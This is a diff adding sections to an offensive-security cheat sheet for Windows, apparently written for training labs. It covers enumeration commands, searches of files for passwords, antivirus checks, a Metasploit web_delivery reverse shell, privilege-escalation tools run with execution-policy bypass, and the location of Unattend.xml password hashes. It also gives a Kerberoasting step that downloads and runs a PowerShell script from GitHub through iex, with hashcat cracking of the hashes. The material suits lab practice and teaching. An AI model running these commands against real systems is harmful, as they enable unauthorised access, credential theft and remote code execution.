@@ -452,13 +452,56 @@ initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nisha
 
   
 
+### Information Gathering
+
+- User
+
+  Current user’s privileges: `whoami /priv`
+
+  List users: `net users`
+
+  List details of a user: `net user username` (e.g. `net user Administrator`)
+
+  Other users logged in simultaneously: `qwinsta` (or `query session`)
+
+  User groups defined on the system: `net localgroup`
+
+  List members of a specific group: `net localgroup groupname` (e.g. `net localgroup Administrators`)
+
+- System
+
+  `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
+
+  `hostname`
+
+- Files
+
+  `findstr /si password *.txt` (`.xml`, `.ini`, `.config`, `.xls` are also good choice)
+
+- Patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
+
+- Network: `netstat -ano`
+
+- Scheduled tasks: `schtasks /query /fo LIST /v`
+
+- Driver: `driverquery`
+
+- Antivirus
+
+  - Windows defender: `sc query windefend`
+  - Antivirus software: `sc queryex type=service`
+
+
+
 ### RDP
 
-```bash
-xfreerdp /u:admin /p:password /cert:ignore /v:10.10.227.138 /workarea
-```
+- XfreeRDP
 
+  ```bash
+  xfreerdp /u:admin /p:password /cert:ignore /v:10.10.227.138 /workarea
+  ```
 
+- Remmina
 
 ### Buffer Overflow
 
@@ -620,6 +663,12 @@ Also you can use windows/meterpreter/reverse_tcp and get shell with multi/handle
   meterpreter > upload <file>
   ```
 
+- Send shell
+
+  use "exploit/multi/script/web_delivery" and payload "windows/meterpreter/reverse_http", set target as 2
+
+  
+
 ### PowerShell
 
 `Verb-Noun`, Ex. `Get-Help Command-Name -examples`, `Get-Command New-*`
@@ -659,6 +708,39 @@ Show owner of file: `Get-Acl C:/`
 
 
 ## Privilege Escalation
+
+[Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+### Tools
+
+- WinPEAS: `winpeas.exe > outputfile.txt` (WinPEAS will be blocked by Windows Defender)
+
+- PowerUp.ps1
+
+  ```powershell
+  Shell> powershell.exe -nop -exec bypass
+  PS> Import-Module .\PowerUp.ps1
+  PS> Invoke-AllChecks
+  ```
+
+- Windows Exploit Suggester(More stealth than WinPEAS. Run on attacker machine)
+
+  Beforehand run `systeminfo` on target, and save as `.txt` file
+
+  ```bash
+  windows-exploit-suggester.py –update
+  windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo_out.txt
+  ```
+
+  Or WES-NG:
+
+  ```
+  pip install wesng
+  wes.py --update
+  wes.py systeminfo_out.txt
+  ```
+
+- Metasploit: `multi/recon/local_exploit_suggester`
 
 ### token impersonation
 
@@ -715,6 +797,12 @@ python3 firefox_decrypt.py <file path>
 ```
 
 use psexec in impacket, or rpc to login
+
+### Gain Base64 encoded password
+
+hash is in C:\Windows\Panther\Unattend\Unattended.xml
+
+
 
 ## Attack Kerberos
 
@@ -841,6 +929,21 @@ Rubeus.exe brute /password:Password1 /noticket
   sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.122.227 -request
   hashcat -m 13100 -a 0 hash.txt rockyou.txt
   ```
+
+- method 3: When you already in target machine; To gain Username,
+
+  ```
+  PS> setspn -T medin -Q */*
+  ```
+
+  And then gain password hash
+
+  ```
+  PS> iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
+  PS> Invoke-Kerberoast -OutputFormat hashcat |fl
+  ```
+
+  Then brute-force `hashcat -m 13100 -a 0 hash.txt <wordlist> --force`
 
 - query ASReproastable accounts w/Impacket 
 
